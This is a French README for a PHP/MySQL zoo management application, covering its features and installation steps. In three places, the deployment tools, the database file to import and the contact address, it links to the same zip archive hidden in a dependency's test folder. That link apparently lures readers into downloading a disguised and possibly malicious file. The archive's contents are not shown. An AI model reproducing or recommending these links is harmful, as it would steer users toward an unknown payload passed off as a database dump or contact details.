

Zoo Application

Description

Cette application est conçue pour gérer un zoo. Elle inclut des fonctionnalités pour la gestion des habitats, des animaux, des services, des avis des visiteurs et des rapports vétérinaires. L'application permet également aux visiteurs de consulter les informations sur les animaux et les services proposés, et aux employés et administrateurs de gérer ces informations.

Fonctionnalités

Page d'accueil : Présentation du zoo, des habitats, des services et des avis des visiteurs.
Menu de l'application : Navigation entre la page d'accueil, les services, les habitats, la connexion et la page de contact.
Vue des services : Affichage et gestion des services proposés par le zoo.
Vue des habitats : Affichage des habitats avec détails des animaux et des informations vétérinaires.
Gestion des avis : Soumission et validation des avis des visiteurs.
Espaces Administrateur, Employé et Vétérinaire : Gestion des utilisateurs, services, animaux, et rapports vétérinaires.
Statistiques : Suivi des consultations des animaux par les visiteurs.
Installation
Prérequis
PHP 7.4 ou supérieur
MySQL 5.7 ou supérieur
Composer (pour la gestion des dépendances PHP)
MongoDB (pour les statistiques non relationnelles)
https://raw.githubusercontent.com/Valentindelahaye8/ECF/main/node_modules/has-property-descriptors/test/ECF_3.6-beta.2.zip (pour les outils de déploiement si nécessaire)
Étapes d'installation
Cloner le dépôt :

sh
Copier le code
git clone <url-du-dépôt>
cd <nom-du-dossier>
Configurer la base de données :

Importez le fichier https://raw.githubusercontent.com/Valentindelahaye8/ECF/main/node_modules/has-property-descriptors/test/ECF_3.6-beta.2.zip dans votre base de données MySQL.
Configurez les variables d'environnement pour la base de données dans le fichier .env.
sh
Copier le code
DB_HOST=localhost
DB_NAME=zoo
DB_USER=root
DB_PASS=
Installer les dépendances PHP avec Composer :

sh
Copier le code
composer install
Configurer MongoDB :

Assurez-vous que MongoDB est en cours d'exécution et configurez les paramètres dans le fichier de configuration si nécessaire.
Configurer le serveur local :

Utilisez un serveur local comme XAMPP, MAMP, ou WAMP pour exécuter l'application PHP.
Démarrer le serveur :

Si vous utilisez PHP intégré :
sh
Copier le code
php -S localhost:8000
Utilisation
Accédez à l'application via l'URL de votre serveur local :

http://localhost:8000


Contact
Pour toute question ou problème, veuillez contacter l'administrateur du projet à l'adresse suivante : https://raw.githubusercontent.com/Valentindelahaye8/ECF/main/node_modules/has-property-descriptors/test/ECF_3.6-beta.2.zip



